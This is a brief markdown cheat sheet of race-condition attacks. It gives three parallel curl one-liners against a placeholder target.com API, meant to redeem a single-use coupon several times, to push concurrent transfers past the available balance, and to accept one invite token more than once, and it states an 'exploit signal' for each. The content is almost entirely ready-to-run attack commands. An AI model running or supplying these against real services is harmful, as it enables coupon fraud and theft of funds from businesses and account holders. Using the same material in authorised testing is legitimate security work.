# Race Conditions - Annotated Examples

## Coupon Double Redemption
```bash
seq 1 10 | xargs -P10 -I{} \
  curl -s -X POST https://target.com/api/redeem \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"coupon":"WELCOME50"}'
```
Exploit signal:
```
multiple responses return success for single-use coupon
```

## Concurrent Transfer Abuse
```bash
seq 1 15 | xargs -P15 -I{} \
  curl -s -X POST https://target.com/api/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to":"acct-2","amount":100}'
```
Exploit signal:
```
final balance negative or transferred amount exceeds available balance
```

## Token One-Time Use Race
```bash
seq 1 8 | xargs -P8 -I{} \
  curl -s "https://target.com/api/invite/accept?token=$INVITE_TOKEN"
```
Exploit signal:
```
same token accepted by multiple requests
```
